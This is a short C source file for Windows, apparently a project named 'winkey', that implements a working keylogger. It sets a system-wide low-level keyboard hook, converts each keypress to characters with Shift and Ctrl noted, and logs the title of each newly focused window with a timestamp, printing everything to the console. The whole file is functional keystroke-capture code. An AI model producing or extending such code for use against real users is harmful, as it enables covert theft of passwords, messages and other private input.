#include "winkey.h"

HHOOK g_hook;
HWINEVENTHOOK g_hook_event;

void		log_window(SYSTEMTIME st, char *window_name)
{
	printf("\n[%02d.%02d.%04d %02d:%02d] - '%s'\n",st.wDay, st.wMonth, st.wYear, st.wHour, st.wMinute, window_name);
}

void		log_key(unsigned char key)
{
	printf("%c", key);
}

LRESULT __stdcall hook_callback(int n_code, WPARAM w_param, LPARAM l_param)
{
	if (n_code >= 0)
	{
		if (w_param == WM_KEYDOWN)
		{
			char buffer[256];
			memset(buffer, 0, sizeof(buffer));
			char *ptr = buffer;
			HKL hkl = GetKeyboardLayout(0);
			BYTE keyboardState[256];
			memset(keyboardState, 0, sizeof(keyboardState));
            KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT*)l_param;
			wchar_t keyBuf[8];
			memset(keyBuf, 0, sizeof(keyBuf));
			GetKeyState(0);
			GetKeyboardState(keyboardState);
			if (((GetAsyncKeyState(VK_LSHIFT) & 0x8000) || (GetAsyncKeyState(VK_RSHIFT) & 0x8000)) &&
				(kb->vkCode >= 'A'  && kb->vkCode <= 'Z'))
			{
				memcpy(ptr, "Shift", 5);
				ptr += 5;
			}
			if ((GetAsyncKeyState(VK_LCONTROL) & 0x8000) || (GetAsyncKeyState(VK_RCONTROL) & 0x8000))
			{
				memcpy(ptr, "Ctrl", 4);
				ptr += 4;
				keyboardState[VK_CONTROL] = 0;
				if (kb->vkCode >= 'A'  && kb->vkCode <= 'Z')
					keyboardState[VK_SHIFT] = 128;
			}
			if (ToUnicodeEx(kb->vkCode, kb->scanCode, keyboardState, keyBuf, 8, 0, hkl) > 0)
			{
				size_t n = 0;
				wcstombs_s(&n, ptr, (buffer - ptr) + 256, keyBuf, 8);
				printf("%s", buffer);
			}
		}
	}
	return CallNextHookEx(g_hook, n_code, w_param, l_param);
}

LRESULT __stdcall win_event_proc_callback(HWINEVENTHOOK hWinEventHook, DWORD dwEvent, HWND hwnd, LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime)
{
	SYSTEMTIME st;
	char title[256];

	(void)hWinEventHook, dwEvent, idObject, idChild, dwEventThread, dwmsEventTime;
	GetWindowText(hwnd, title, 256);
	GetSystemTime(&st);
	log_window(st, title);
	return (0);
}

int			main(void)
{
	MSG			msg;

	g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, hook_callback, NULL, 0);
	g_hook_event = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, NULL, win_event_proc_callback, 0, 0, WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);
	while (GetMessage(&msg, NULL, 0, 0))
		;
}
